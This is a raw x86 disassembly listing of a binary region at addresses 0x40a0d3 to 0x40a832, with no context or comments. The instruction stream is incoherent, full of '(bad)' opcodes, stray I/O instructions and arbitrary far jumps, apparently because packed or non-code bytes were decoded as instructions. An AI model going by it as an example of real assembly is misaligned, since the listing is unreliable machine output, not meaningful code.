  40a0d3:	idiv   BYTE PTR [ebx]
  40a0d5:	hlt    
  40a0d6:	cdq    
  40a0d7:	rol    BYTE PTR [ecx+0x7],0x84
  40a0db:	inc    esp
  40a0dc:	sti    
  40a0dd:	push   eax
  40a0de:	outs   dx,BYTE PTR ss:[esi]
  40a0e0:	mov    bl,0x45
  40a0e2:	stos   BYTE PTR es:[edi],al
  40a0e3:	adc    BYTE PTR [edi],ah
  40a0e5:	(bad)  
  40a0e6:	push   ecx
  40a0e7:	push   esp
  40a0e8:	retf   
  40a0e9:	int    0x6a
  40a0eb:	xchg   edx,eax
  40a0ec:	ror    bh,0x69
  40a0ef:	pusha  
  40a0f0:	stos   BYTE PTR es:[edi],al
  40a0f1:	and    esi,DWORD PTR [esp+eiz*2-0x558321bb]
  40a0f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a0f9:	retf   0x9083
  40a0fc:	mov    ebp,0xa427ceb3
  40a101:	mov    dl,0x3d
  40a103:	(bad)  
  40a104:	xchg   ecx,eax
  40a105:	add    bh,BYTE PTR [edx-0x4f4624c5]
  40a10b:	ror    ebp,cl
  40a10d:	icebp  
  40a10e:	dec    ebp
  40a10f:	mov    edi,DWORD PTR [ecx-0x7ced5ff4]
  40a115:	fst    DWORD PTR [ecx+ebp*4]
  40a118:	add    BYTE PTR [esi+eiz*1-0x5e],bh
  40a11c:	inc    ecx
  40a11d:	xchg   ebp,eax
  40a11e:	jmp    0x5e62:0xc6c8d2ec
  40a125:	es ins BYTE PTR es:[edi],dx
  40a127:	icebp  
  40a128:	pusha  
  40a129:	pop    ebp
  40a12a:	add    edi,DWORD PTR [ecx+0xa]
  40a12d:	retf   
  40a12e:	xlat   BYTE PTR ds:[ebx]
  40a12f:	sub    eax,0x59b97b9e
  40a134:	jne    0x40a0de
  40a136:	retf   0xffb8
  40a139:	cmc    
  40a13a:	or     bh,BYTE PTR [ebx]
  40a13c:	push   0x27
  40a13e:	mov    ds:0x9b7c57a3,al
  40a143:	mov    ds:0xbfa2f033,al
  40a148:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a149:	dec    edx
  40a14a:	fwait
  40a14b:	popf   
  40a14c:	lods   eax,DWORD PTR ds:[esi]
  40a14d:	in     al,dx
  40a14e:	and    eax,0x76dcd897
  40a153:	retf   
  40a154:	jb     0x40a1c9
  40a156:	fild   WORD PTR [edx]
  40a158:	out    0xa9,eax
  40a15a:	enter  0x7b88,0xbe
  40a15e:	dec    ebp
  40a15f:	loopne 0x40a1a3
  40a161:	(bad)  
  40a162:	and    DWORD PTR [esi+0x168fc29],0x4
  40a169:	mov    al,ds:0xf438eccd
  40a16e:	test   eax,0x7681c
  40a173:	add    DWORD PTR [esi-0x598c2d69],edi
  40a179:	jp     0x40a10a
  40a17b:	fcom   DWORD PTR [ecx+0x6d138510]
  40a181:	test   eax,0x33b01822
  40a186:	mov    bh,0x66
  40a188:	jb     0x40a1bf
  40a18a:	push   0xffffffc8
  40a18c:	test   eax,0x587aca3a
  40a191:	mov    edx,0x10bb76d1
  40a196:	icebp  
  40a197:	into   
  40a198:	mov    ah,dl
  40a19a:	push   edx
  40a19b:	pop    ecx
  40a19c:	int    0x9a
  40a19e:	mov    dh,0x76
  40a1a0:	and    al,BYTE PTR [edx]
  40a1a2:	repnz mov al,0x2d
  40a1a5:	sub    DWORD PTR [edx-0x622e9f5],esi
  40a1ab:	push   edx
  40a1ac:	fwait
  40a1ad:	daa    
  40a1ae:	inc    esi
  40a1af:	jmp    0x40a14b
  40a1b1:	(bad)  
  40a1b2:	fsubr  QWORD PTR [eax*2-0x4f74769b]
  40a1b9:	xchg   edi,eax
  40a1ba:	push   ds
  40a1bb:	mov    ah,0x24
  40a1bd:	pop    ebp
  40a1be:	mul    BYTE PTR [esi-0x27]
  40a1c1:	addr16 sub ah,bl
  40a1c4:	xchg   esp,eax
  40a1c5:	test   eax,0x66e3d779
  40a1ca:	or     BYTE PTR [esi],ah
  40a1cc:	test   DWORD PTR [ebx-0x7],ebp
  40a1cf:	scas   eax,DWORD PTR es:[edi]
  40a1d0:	test   eax,0x864e9f3e
  40a1d5:	jmp    FWORD PTR [ebx+0x5fe2341c]
  40a1db:	push   ebp
  40a1dc:	pop    ecx
  40a1dd:	add    eax,0xc9767988
  40a1e2:	(bad)  
  40a1e3:	sub    BYTE PTR [ebp-0x1c],cl
  40a1e6:	pop    esp
  40a1e7:	dec    eax
  40a1e8:	mov    ah,0xfb
  40a1ea:	inc    ecx
  40a1eb:	repz xchg esi,eax
  40a1ed:	pop    eax
  40a1ee:	push   edx
  40a1ef:	jns    0x40a1b2
  40a1f1:	push   es
  40a1f2:	inc    ebx
  40a1f3:	into   
  40a1f4:	ret    
  40a1f5:	adc    eax,DWORD PTR [ebp-0x4d01c120]
  40a1fb:	dec    esp
  40a1fc:	call   0xbf50:0x1cf0c2a6
  40a203:	adc    bl,BYTE PTR [ecx]
  40a205:	mov    ds:0x5aa30dad,al
  40a20a:	popa   
  40a20b:	jnp    0x40a1f8
  40a20d:	inc    eax
  40a20e:	es mov ebx,0x31cce914
  40a214:	xchg   DWORD PTR [ebx+0x42],eax
  40a217:	hlt    
  40a218:	inc    ebx
  40a219:	and    bh,BYTE PTR [ebx]
  40a21b:	jae    0x40a1ca
  40a21d:	sub    BYTE PTR [ebx-0x58],al
  40a220:	sbb    dl,al
  40a222:	sub    BYTE PTR [ecx+0x1d87c433],ah
  40a228:	push   esi
  40a229:	sti    
  40a22a:	cmp    al,0x67
  40a22c:	dec    edx
  40a22d:	pop    edx
  40a22e:	lahf   
  40a22f:	xlat   BYTE PTR ds:[ebx]
  40a230:	fidiv  WORD PTR [eax+0x47]
  40a233:	(bad)  [ecx]
  40a235:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a236:	fadd   DWORD PTR [ebp+eax*2-0x17]
  40a23a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a23b:	ds push ds
  40a23d:	push   edi
  40a23e:	mov    esp,0x7e0902d0
  40a243:	xchg   edi,eax
  40a244:	jbe    0x40a288
  40a246:	pop    ebx
  40a247:	mov    ebx,0xf9e721cf
  40a24c:	cmp    DWORD PTR [ebp+esi*2-0x2c],esi
  40a250:	xor    DWORD PTR [edx],edi
  40a252:	repz rcl DWORD PTR [edi+0x64fabe04],0x61
  40a25a:	out    0x5f,eax
  40a25c:	xor    eax,0xcef3bc0d
  40a261:	jmp    0xe7bb0948
  40a266:	mov    WORD PTR [ebx+eax*4],?
  40a269:	(bad)  
  40a26a:	loopne 0x40a22f
  40a26c:	jp     0x40a2cc
  40a26e:	out    0xb4,al
  40a270:	aam    0x6
  40a272:	fwait
  40a273:	xor    al,0xc3
  40a275:	jg     0x40a238
  40a277:	sar    cl,cl
  40a279:	or     edx,DWORD PTR [ebx]
  40a27b:	add    esp,DWORD PTR [ecx+edx*8-0x69]
  40a27f:	inc    esi
  40a280:	test   BYTE PTR [ebp-0x30ad0a12],bh
  40a286:	dec    ebp
  40a287:	dec    edi
  40a288:	outs   dx,BYTE PTR ds:[esi]
  40a289:	cld    
  40a28a:	sar    BYTE PTR [esi+0x71525e23],1
  40a290:	xor    DWORD PTR [edi+edi*1],ebp
  40a293:	cdq    
  40a294:	cmp    al,0x1a
  40a296:	xor    ecx,DWORD PTR [esp+ecx*4]
  40a299:	ror    esp,1
  40a29b:	call   0xba14:0x930930a7
  40a2a2:	mov    ds:0x61ce7e49,eax
  40a2a7:	cmove  ecx,DWORD PTR [eax-0xf]
  40a2ab:	dec    esp
  40a2ac:	sbb    BYTE PTR [ebx],bh
  40a2ae:	xor    edx,ebx
  40a2b0:	das    
  40a2b1:	pop    eax
  40a2b2:	ja     0x40a268
  40a2b4:	in     al,0xb8
  40a2b6:	add    eax,0x414f465e
  40a2bb:	repnz add esp,edx
  40a2be:	add    esp,esi
  40a2c0:	sahf   
  40a2c1:	iret   
  40a2c2:	cld    
  40a2c3:	les    ecx,FWORD PTR [ecx+0x5]
  40a2c6:	and    eax,0xd453cde7
  40a2cb:	mov    ebx,edx
  40a2cd:	mov    ebx,0xdaa85def
  40a2d2:	cld    
  40a2d3:	adc    ecx,DWORD PTR [esi-0x4a96e639]
  40a2d9:	add    ah,BYTE PTR [ebp-0x595651b4]
  40a2df:	mov    esp,0x29e8db14
  40a2e4:	jns    0x40a2ef
  40a2e6:	push   0xffffff89
  40a2e8:	out    dx,eax
  40a2e9:	pusha  
  40a2ea:	rol    DWORD PTR [ebp-0x5f],0x3d
  40a2ee:	in     eax,0x25
  40a2f0:	xor    edx,esp
  40a2f2:	aam    0x21
  40a2f4:	or     edi,esp
  40a2f6:	inc    esp
  40a2f7:	jle    0x40a2fc
  40a2f9:	(bad)  
  40a2fb:	jmp    0x40a2d9
  40a2fd:	push   edx
  40a2fe:	(bad)  
  40a2ff:	daa    
  40a300:	dec    ecx
  40a301:	jecxz  0x40a2a4
  40a303:	pushf  
  40a304:	pop    esp
  40a305:	jno    0x40a33e
  40a307:	and    eax,0x6ab22a54
  40a30c:	and    DWORD PTR [ecx+edx*1+0x6a669f32],edi
  40a313:	inc    ebp
  40a314:	in     eax,dx
  40a315:	push   ebp
  40a316:	and    eax,0x94493809
  40a31b:	inc    ebp
  40a31c:	leave  
  40a31d:	push   ebx
  40a31e:	das    
  40a31f:	sbb    al,0x4f
  40a321:	(bad)  
  40a322:	cmp    DWORD PTR [esi-0x57],esi
  40a325:	lods   eax,DWORD PTR ds:[esi]
  40a326:	scas   eax,DWORD PTR es:[edi]
  40a327:	ret    
  40a328:	(bad)  
  40a329:	out    dx,al
  40a32a:	xchg   ebx,eax
  40a32b:	push   eax
  40a32c:	add    al,0x66
  40a32e:	retf   
  40a32f:	cmp    dl,bh
  40a331:	daa    
  40a332:	lods   al,BYTE PTR ds:[esi]
  40a333:	jmp    0x7dbd736
  40a338:	pusha  
  40a339:	jp     0x40a338
  40a33b:	(bad)  
  40a33d:	push   ebx
  40a33e:	and    edx,DWORD PTR [edi]
  40a340:	into   
  40a341:	neg    DWORD PTR [edx+0x65f8ef50]
  40a347:	sub    eax,DWORD PTR [ecx+ebx*8+0x48a9519f]
  40a34e:	popf   
  40a34f:	push   ss
  40a350:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a351:	ret    
  40a352:	xchg   esp,eax
  40a353:	mov    WORD PTR [ecx-0x31],es
  40a356:	clc    
  40a357:	lea    esp,[ebp+0x6a]
  40a35a:	cmc    
  40a35b:	imul   ecx,DWORD PTR [ebp-0x5fafe55e],0xae28e738
  40a365:	push   esi
  40a366:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a367:	fs retf 
  40a369:	adc    DWORD PTR [ebx-0x333ed089],ebp
  40a36f:	pop    ebx
  40a370:	loopne 0x40a31c
  40a372:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a373:	iret   
  40a374:	daa    
  40a375:	loopne 0x40a3d6
  40a377:	sub    ebx,eax
  40a379:	nop
  40a37a:	jl     0x40a3f9
  40a37c:	cmp    cl,BYTE PTR [ecx+esi*1-0x409d7651]
  40a383:	je     0x40a321
  40a385:	test   eax,0xdc33fb51
  40a38a:	iret   
  40a38b:	mov    eax,0xe527f7bb
  40a390:	test   eax,0xc90dfe87
  40a395:	outs   dx,BYTE PTR ds:[esi]
  40a396:	jnp    0x40a35c
  40a398:	fist   DWORD PTR cs:[ecx+0x2c]
  40a39c:	push   ecx
  40a39d:	inc    eax
  40a39e:	mov    ecx,0xdef38c9c
  40a3a3:	(bad)  
  40a3a4:	dec    esi
  40a3a5:	jae    0x40a3c1
  40a3a7:	shl    DWORD PTR [ebx],1
  40a3a9:	dec    ebp
  40a3aa:	ins    DWORD PTR es:[di],dx
  40a3ac:	or     DWORD PTR [ebp+0x79b7b736],ebx
  40a3b2:	loope  0x40a411
  40a3b4:	arpl   WORD PTR [ebx],bp
  40a3b6:	and    dh,BYTE PTR [ecx-0x55]
  40a3b9:	and    dh,dl
  40a3bb:	call   DWORD PTR [ecx+0x37ee2c4a]
  40a3c1:	add    ebx,esi
  40a3c3:	mov    dl,0x9f
  40a3c5:	pop    ds
  40a3c6:	daa    
  40a3c7:	mov    eax,ds:0xec0919bb
  40a3cc:	out    0x69,eax
  40a3ce:	shr    BYTE PTR [esi+0x36],1
  40a3d1:	(bad)  
  40a3d2:	scas   eax,DWORD PTR es:[edi]
  40a3d3:	cdq    
  40a3d4:	ins    DWORD PTR es:[edi],dx
  40a3d5:	inc    eax
  40a3d6:	add    DWORD PTR [esi],esp
  40a3d8:	mov    ?,WORD PTR [ecx-0x2639d4c3]
  40a3de:	pop    edx
  40a3df:	sub    ch,dl
  40a3e1:	xchg   ebp,eax
  40a3e2:	imul   ebp,DWORD PTR [edx-0x2d],0x62
  40a3e6:	adc    cl,BYTE PTR [ecx]
  40a3e8:	lods   eax,DWORD PTR ds:[esi]
  40a3e9:	mov    ebx,0xb8d3e3ea
  40a3ee:	and    ecx,DWORD PTR [eax+0x5f]
  40a3f1:	and    ecx,DWORD PTR [eax]
  40a3f3:	mov    bh,0xe9
  40a3f5:	pop    ebp
  40a3f6:	pop    esp
  40a3f7:	pop    edx
  40a3f8:	xlat   BYTE PTR ds:[ebx]
  40a3f9:	sub    ah,BYTE PTR [esi-0x76]
  40a3fc:	cmp    eax,0xa789e56
  40a401:	adc    eax,0xe7b114c3
  40a406:	cdq    
  40a407:	pop    ds
  40a408:	daa    
  40a409:	outs   dx,BYTE PTR ds:[esi]
  40a40a:	stos   BYTE PTR es:[edi],al
  40a40b:	in     al,dx
  40a40c:	imul   BYTE PTR [edx]
  40a40e:	in     eax,dx
  40a40f:	in     al,dx
  40a410:	mov    ebp,0xeee42718
  40a415:	dec    esi
  40a416:	push   edx
  40a417:	sub    ebp,DWORD PTR [bx+di-0x5196]
  40a41c:	ret    
  40a41d:	loop   0x40a460
  40a41f:	retf   0x643d
  40a422:	out    dx,al
  40a423:	mov    BYTE PTR [edx+ecx*2],dh
  40a426:	add    ebp,esp
  40a428:	dec    edi
  40a429:	xchg   esi,eax
  40a42a:	add    ebp,DWORD PTR [ecx]
  40a42c:	pop    ebx
  40a42d:	xchg   ebx,eax
  40a42e:	lds    esi,FWORD PTR [ecx-0x4f373eee]
  40a434:	xlat   BYTE PTR ds:[ebx]
  40a435:	sbb    dh,cl
  40a437:	test   al,0x90
  40a439:	cwde   
  40a43a:	add    eax,0x712886c6
  40a43f:	jo     0x40a485
  40a441:	cld    
  40a442:	pop    ebp
  40a443:	mov    esp,0x998a871d
  40a448:	jle    0x40a416
  40a44a:	push   cs
  40a44b:	push   esp
  40a44c:	xchg   BYTE PTR [edx+ebp*2+0x74af5eac],dl
  40a453:	call   0xf4af:0x9f1e44ae
  40a45a:	jo     0x40a4cd
  40a45c:	sub    bh,ah
  40a45e:	enter  0x140a,0x95
  40a462:	mov    esi,0x1133189d
  40a467:	ins    BYTE PTR es:[edi],dx
  40a468:	or     DWORD PTR [edi+0x456a15e5],0xffffff94
  40a46f:	jb     0x40a4b7
  40a471:	adc    ecx,DWORD PTR [ecx+0x42]
  40a474:	adc    BYTE PTR [esi+0x70],0x68
  40a478:	cmp    ebp,ebp
  40a47a:	jae    0x40a475
  40a47c:	jne    0x40a40f
  40a47e:	nop
  40a47f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a480:	lea    ebp,[ecx+ebx*8+0x3a]
  40a484:	dec    esi
  40a485:	iret   
  40a486:	push   eax
  40a487:	jae    0x40a486
  40a489:	pop    edi
  40a48a:	adc    bh,BYTE PTR fs:[edx+0x3c]
  40a48e:	push   cs
  40a48f:	dec    ecx
  40a490:	push   cs
  40a491:	shl    BYTE PTR [ebx+edi*8-0x2a6a2ea5],1
  40a498:	jecxz  0x40a474
  40a49a:	sbb    eax,0x1fc38231
  40a49f:	nop
  40a4a0:	xlat   BYTE PTR ds:[ebx]
  40a4a1:	dec    edx
  40a4a2:	or     eax,0x7608748
  40a4a7:	pop    ebp
  40a4a8:	add    ecx,DWORD PTR [eax+0x84b7f0e]
  40a4ae:	jae    0x40a4f7
  40a4b0:	xor    eax,0x9febbadf
  40a4b5:	loope  0x40a485
  40a4b7:	repnz mov ds,edi
  40a4ba:	xor    dl,BYTE PTR [edi-0x58]
  40a4bd:	dec    edx
  40a4be:	sbb    eax,0x4cbd79db
  40a4c3:	addr16 stc 
  40a4c5:	mov    esp,0xabe72cc2
  40a4ca:	enter  0x2629,0x71
  40a4ce:	mov    WORD PTR ds:0xc097d614,?
  40a4d4:	ror    BYTE PTR [esi+edi*2+0x7b494941],cl
  40a4db:	retf   
  40a4dc:	pop    edi
  40a4dd:	mov    esi,0xc0e11e9b
  40a4e2:	(bad)  
  40a4e3:	into   
  40a4e4:	shl    BYTE PTR [ebx-0x44f8eced],1
  40a4ea:	or     DWORD PTR [eax-0x16],ebp
  40a4ed:	(bad)  
  40a4ee:	cmp    ch,0x4f
  40a4f1:	dec    ebx
  40a4f2:	inc    edi
  40a4f3:	mov    ds:0x9ba05bb9,al
  40a4f8:	repnz or BYTE PTR [edi-0x67075e9],0x27
  40a500:	jge    0x40a494
  40a502:	cdq    
  40a503:	jmp    0x40a568
  40a505:	fild   DWORD PTR [edi]
  40a507:	sub    al,0xb7
  40a509:	add    DWORD PTR [esi+0x23],esi
  40a50c:	dec    esp
  40a50d:	popa   
  40a50e:	bound  edx,QWORD PTR [ecx]
  40a510:	dec    DWORD PTR [ecx+edi*8-0x5f289a58]
  40a517:	aam    0xfd
  40a519:	push   esi
  40a51a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a51b:	dec    esi
  40a51c:	popa   
  40a51d:	cs fs (bad) 
  40a521:	jmp    0x40a51b
  40a523:	js     0x40a523
  40a525:	fdivr  DWORD PTR [ebp+ebx*2+0x54]
  40a529:	mov    ebp,ss
  40a52b:	and    DWORD PTR [edi+0x77f04196],edi
  40a531:	scas   al,BYTE PTR es:[edi]
  40a532:	dec    ebx
  40a533:	and    esp,DWORD PTR [ecx]
  40a535:	dec    ecx
  40a536:	jle    0x40a582
  40a538:	push   ebp
  40a539:	nop
  40a53a:	in     eax,dx
  40a53b:	jb     0x40a4d6
  40a53d:	fistp  QWORD PTR [esi-0x68c6cbaf]
  40a543:	sti    
  40a544:	push   edi
  40a545:	adc    BYTE PTR [ebx],bl
  40a547:	and    dh,0x29
  40a54a:	mov    ecx,ecx
  40a54c:	rcl    DWORD PTR [ebx],1
  40a54e:	pop    ebx
  40a54f:	popf   
  40a550:	daa    
  40a551:	add    dh,ch
  40a553:	in     al,0x1e
  40a555:	adc    BYTE PTR [ebx-0x63],dl
  40a558:	je     0x40a58f
  40a55a:	push   ds
  40a55b:	xchg   esi,eax
  40a55c:	xor    al,0xe1
  40a55e:	sub    al,BYTE PTR [edi+0x3a098836]
  40a564:	mov    ds:0x1d9a0fe1,eax
  40a569:	lock or al,0x83
  40a56c:	call   0xbb5:0x883d2bdf
  40a573:	add    dl,al
  40a575:	lods   al,BYTE PTR ds:[esi]
  40a576:	jns    0x40a520
  40a578:	jmp    0x167559a4
  40a57d:	mov    dl,0xa4
  40a57f:	sbb    DWORD PTR [ebx+0x493d33cd],edi
  40a585:	inc    ecx
  40a586:	addr16 cmp cl,ch
  40a589:	inc    esi
  40a58a:	popf   
  40a58b:	xchg   BYTE PTR [ebp+0x57],al
  40a58e:	mov    cl,0xc7
  40a590:	fist   DWORD PTR [edi]
  40a592:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a593:	mov    edx,DWORD PTR [ebx]
  40a595:	lock pushf 
  40a597:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a598:	int    0xdd
  40a59a:	xchg   BYTE PTR ds:0x5401f435,dh
  40a5a0:	dec    ebx
  40a5a1:	mov    edx,0xc335dd93
  40a5a6:	jge    0x40a60e
  40a5a8:	ss out dx,al
  40a5aa:	or     ebp,DWORD PTR [ebx]
  40a5ac:	add    eax,DWORD PTR [edx+0x4530a647]
  40a5b2:	pop    ss
  40a5b3:	or     BYTE PTR [edx+ebp*1],ch
  40a5b6:	arpl   WORD PTR [edx],cx
  40a5b8:	pop    ds
  40a5b9:	mov    ebp,0x780aba00
  40a5be:	xchg   ebx,eax
  40a5bf:	ins    BYTE PTR es:[edi],dx
  40a5c0:	cld    
  40a5c1:	adc    al,0x7
  40a5c3:	cmp    BYTE PTR [ebx+0x61],ah
  40a5c6:	inc    esi
  40a5c7:	pusha  
  40a5c8:	loop   0x40a5f2
  40a5ca:	xchg   esi,eax
  40a5cb:	dec    eax
  40a5cc:	in     eax,dx
  40a5cd:	dec    edi
  40a5ce:	test   BYTE PTR [eax+ebx*2-0x31],al
  40a5d2:	adc    ebp,DWORD PTR [ebx+0x4040f5af]
  40a5d8:	sbb    al,BYTE PTR [esi-0x3e27b1b7]
  40a5de:	neg    edi
  40a5e0:	inc    DWORD PTR [esi*2-0x5dd51eff]
  40a5e7:	mov    ebx,DWORD PTR [edx-0x2b]
  40a5ea:	imul   esi,edi,0x8231a298
  40a5f0:	pop    edi
  40a5f1:	(bad)  
  40a5f2:	call   0xbaf91561
  40a5f7:	jle    0x40a5ef
  40a5f9:	outs   dx,DWORD PTR ds:[esi]
  40a5fa:	loope  0x40a59c
  40a5fc:	repz jae 0x40a599
  40a5ff:	pop    ecx
  40a600:	ds iret 
  40a602:	ds add eax,0x3fb19bbb
  40a608:	cmp    al,0xb5
  40a60a:	gs jg  0x40a5b2
  40a60d:	pop    ss
  40a60e:	or     dl,BYTE PTR [ecx-0x32828f1c]
  40a614:	leave  
  40a615:	push   eax
  40a616:	xchg   edi,eax
  40a617:	inc    eax
  40a618:	shl    BYTE PTR [ecx-0x39],0x70
  40a61c:	call   0x5238:0x1e2863c6
  40a623:	fisttp DWORD PTR [eax+edi*4+0x3d]
  40a627:	ret    0xb4dd
  40a62a:	fs test al,0x96
  40a62d:	dec    esi
  40a62e:	mov    ds:0xe7ad0b68,al
  40a633:	push   eax
  40a634:	jno    0x40a68a
  40a636:	stos   BYTE PTR es:[edi],al
  40a637:	xor    BYTE PTR [ebx],0xdb
  40a63a:	scas   eax,DWORD PTR es:[edi]
  40a63b:	push   esi
  40a63c:	push   eax
  40a63d:	shl    eax,cl
  40a63f:	imul   edx,DWORD PTR [eax-0x1349c5d1],0x582f074d
  40a649:	lea    esp,cs:[ebp-0x3e53f8c]
  40a650:	sbb    ah,0x2b
  40a653:	cmp    eax,0xb7010f80
  40a658:	icebp  
  40a659:	xchg   esp,eax
  40a65a:	xchg   ebx,eax
  40a65b:	sti    
  40a65c:	push   0xdef01981
  40a661:	sub    eax,0x16307d60
  40a666:	sub    al,0x9a
  40a668:	call   0xf6733197
  40a66d:	sub    eax,0xac83957
  40a672:	pop    es
  40a673:	sub    eax,0x9af919ad
  40a678:	and    DWORD PTR [ebp-0x143df47e],ecx
  40a67e:	xchg   ecx,eax
  40a67f:	sbb    eax,0x126809a3
  40a684:	cmp    eax,0x4f624fb2
  40a689:	lahf   
  40a68a:	sbb    DWORD PTR [edx-0x2d],0x6f
  40a68e:	cdq    
  40a68f:	into   
  40a690:	scas   eax,DWORD PTR es:[edi]
  40a691:	stos   BYTE PTR es:[edi],al
  40a692:	les    esi,FWORD PTR [eax-0x48e811b7]
  40a698:	xchg   esp,eax
  40a699:	sub    bh,BYTE PTR [ebp+0x55c33324]
  40a69f:	mov    BYTE PTR [edx-0x23],bl
  40a6a2:	add    ah,0xf0
  40a6a5:	sti    
  40a6a6:	sub    eax,0xad13ce7a
  40a6ab:	push   0x67dda0a4
  40a6b0:	xor    eax,0x63b562c
  40a6b5:	icebp  
  40a6b6:	fnstsw WORD PTR [ecx]
  40a6b8:	push   edx
  40a6b9:	xor    eax,0xa8340e85
  40a6be:	js     0x40a6f7
  40a6c0:	inc    ebx
  40a6c1:	ror    BYTE PTR [edx-0x4a7f0f77],0xaf
  40a6c8:	and    al,0x4e
  40a6ca:	sub    eax,0xfc52aa08
  40a6cf:	inc    edx
  40a6d0:	pop    es
  40a6d1:	fadd   st(1),st
  40a6d3:	mov    ch,0xb8
  40a6d5:	dec    eax
  40a6d6:	dec    esi
  40a6d7:	fst    QWORD PTR [edx-0x36]
  40a6da:	rcr    al,cl
  40a6dc:	lock xchg esi,eax
  40a6de:	pop    edx
  40a6df:	push   0x389c34fc
  40a6e4:	ins    BYTE PTR es:[edi],dx
  40a6e5:	in     eax,0x5e
  40a6e7:	mul    bl
  40a6e9:	sbb    ch,BYTE PTR [edi-0x122f77a]
  40a6ef:	aad    0x36
  40a6f1:	xchg   ebp,eax
  40a6f2:	aad    0x2a
  40a6f4:	push   es
  40a6f5:	jmp    0x8bf8:0xbdfee23c
  40a6fc:	and    al,0x6b
  40a6fe:	popa   
  40a6ff:	add    BYTE PTR [ebx-0x3bb20714],ah
  40a705:	jns    0x40a692
  40a707:	call   0x174c2f10
  40a70c:	mov    ebx,0x82929987
  40a711:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a712:	add    eax,0x67ab661f
  40a717:	dec    ecx
  40a718:	sbb    al,0xe0
  40a71a:	in     al,0x81
  40a71c:	loopne 0x40a73b
  40a71e:	and    ecx,DWORD PTR [ecx-0x39]
  40a721:	imul   ebp,DWORD PTR [ebp+0x77],0x17
  40a725:	mov    ch,0x30
  40a727:	aas    
  40a728:	lahf   
  40a729:	scas   al,BYTE PTR es:[edi]
  40a72a:	aas    
  40a72b:	cs add cl,dh
  40a72e:	and    BYTE PTR [ebp-0x4d0a9fa9],dl
  40a734:	or     BYTE PTR [ecx+0x3cf30078],ah
  40a73a:	rcl    BYTE PTR [ecx],1
  40a73c:	bound  ebp,QWORD PTR [ecx+0x73]
  40a73f:	out    dx,eax
  40a740:	imul   ebp,DWORD PTR [edi],0x70
  40a743:	lds    edx,FWORD PTR [eax-0x644e9ea5]
  40a749:	xchg   BYTE PTR [esp+edx*1],ch
  40a74c:	popf   
  40a74d:	hlt    
  40a74e:	add    al,0x8a
  40a750:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a751:	dec    esi
  40a752:	loop   0x40a76d
  40a754:	aaa    
  40a755:	add    ah,dl
  40a757:	xlat   BYTE PTR ds:[ebx]
  40a758:	loope  0x40a75d
  40a75a:	fnstsw WORD PTR [esi+0x21]
  40a75d:	inc    edi
  40a75e:	stc    
  40a75f:	cld    
  40a760:	stc    
  40a761:	pop    edx
  40a762:	dec    eax
  40a763:	or     al,0xdd
  40a765:	inc    edx
  40a766:	jmp    0x40a7d4
  40a768:	xchg   esi,ebp
  40a76a:	pop    ds
  40a76b:	xchg   ebp,eax
  40a76c:	lds    esi,FWORD PTR [eax-0xa8e751e]
  40a772:	sbb    dh,bl
  40a774:	sahf   
  40a775:	push   esi
  40a776:	dec    edi
  40a777:	in     eax,0x36
  40a779:	ins    DWORD PTR es:[edi],dx
  40a77a:	outs   dx,BYTE PTR ds:[esi]
  40a77b:	and    DWORD PTR [edi-0x65758a54],esi
  40a781:	fiadd  WORD PTR [esi+edx*4-0x76e87668]
  40a788:	sbb    BYTE PTR [ebp-0x48],ch
  40a78b:	ins    BYTE PTR es:[edi],dx
  40a78c:	mov    bl,0xc3
  40a78e:	sbb    eax,0x64953cb5
  40a793:	retf   0x2283
  40a796:	mov    esp,0x25c32c47
  40a79b:	xor    ah,BYTE PTR [eax+0x6330ee78]
  40a7a1:	xchg   BYTE PTR fs:[eax],ah
  40a7a4:	arpl   WORD PTR [ebx],ax
  40a7a6:	mov    eax,ds:0xc1b18eb8
  40a7ab:	adc    ebp,DWORD PTR [ebx]
  40a7ad:	inc    esp
  40a7ae:	repnz sbb esp,edx
  40a7b1:	cmp    eax,0x18698e76
  40a7b6:	mov    cs,WORD PTR ds:0x193a8db
  40a7bc:	jmp    0x7a862cd6
  40a7c1:	and    al,0x2f
  40a7c3:	gs mov ah,0x77
  40a7c6:	inc    ebp
  40a7c7:	in     al,0x0
  40a7c9:	setnp  BYTE PTR [ebp+0x1f]
  40a7cd:	pop    ebx
  40a7cf:	(bad)
  40a7d2:	or     al,0x4d
  40a7d4:	out    0xd9,ax
  40a7d7:	iret   
  40a7d8:	pop    ds
  40a7d9:	jg     0x40a77f
  40a7db:	out    0xef,eax
  40a7dd:	pop    edx
  40a7de:	xor    eax,0xf447bdbd
  40a7e3:	mov    DWORD PTR [esi],edi
  40a7e5:	stos   BYTE PTR es:[edi],al
  40a7e6:	iret   
  40a7e7:	add    BYTE PTR [eax-0x7799cf17],ah
  40a7ed:	mov    ss,WORD PTR [edx-0x6d]
  40a7f0:	mov    edx,0x9eae84c7
  40a7f5:	aas    
  40a7f6:	ret    0xbdf
  40a7f9:	and    ecx,eax
  40a7fb:	add    BYTE PTR [esi+0x3f],bh
  40a7fe:	jno    0x40a821
  40a800:	inc    edi
  40a801:	inc    ebx
  40a802:	hlt    
  40a803:	jl     0x40a831
  40a805:	add    DWORD PTR [edi-0xe],edi
  40a808:	lea    eax,[edi+0x26]
  40a80b:	mov    edi,esi
  40a80d:	int3   
  40a80e:	aaa    
  40a80f:	out    0xad,eax
  40a811:	cmp    eax,0x4d1d304a
  40a816:	lea    edi,[ecx+ecx*4]
  40a819:	rcr    DWORD PTR [esi+0x68c2cdd8],1
  40a81f:	fld    TBYTE PTR [esp+ecx*1]
  40a822:	pushf  
  40a823:	sub    bh,BYTE PTR [edi]
  40a825:	(bad)  
  40a826:	push   0x3ad2d0cc
  40a82b:	mov    ecx,DWORD PTR [ecx]
  40a82d:	mov    dh,0x48
  40a82f:	jle    0x40a800
  40a831:	(bad)  
  40a832:	xor    DWORD PTR [edx+0x4c64ca7b],edi
